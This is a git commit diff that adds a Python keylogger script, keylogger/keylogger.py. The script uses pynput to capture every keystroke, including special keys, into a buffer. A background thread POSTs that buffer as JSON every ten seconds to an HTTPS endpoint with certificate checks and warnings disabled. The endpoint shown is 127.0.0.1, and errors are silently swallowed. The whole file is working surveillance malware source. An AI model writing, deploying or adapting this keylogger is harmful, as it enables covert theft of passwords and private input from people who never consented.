581b2109efdd5bab4077477156a4147129c3063f
Kuba Herka <kubah7776@wp.pl>
2025-08-06 22:42:47 +0200

    Adding all the files

---
+++ keylogger/keylogger.py
@@ -0,0 +1,41 @@
+from pynput import keyboard
+import requests
+import urllib3
+from threading import Thread
+import time
+
+delta_data=""
+urllib3.disable_warnings(category=urllib3.exceptions.InsecureRequestWarning)
+
+def on_press(key):
+    global delta_data
+    error=Exception
+    try:
+        delta_data+=key.char
+    except AttributeError:
+        special_key = f'[{key}]'
+        delta_data+=special_key
+    
+def listener():
+    with keyboard.Listener(on_press=on_press) as listener:
+        listener.join()
+
+def sender():
+    global delta_data
+    while True:
+        if delta_data:
+            obj={"message":delta_data}
+            try:
+                requests.post("https://127.0.0.1:443/", json=obj, verify=False)
+                delta_data=""
+            except:
+                pass
+            time.sleep(10)
+
+if __name__ == "__main__":
+    thread2 = Thread(target=listener)
+    thread1 = Thread(target=sender)
+    thread1.start()
+    thread2.start()
+    thread1.join()
+    thread2.join()
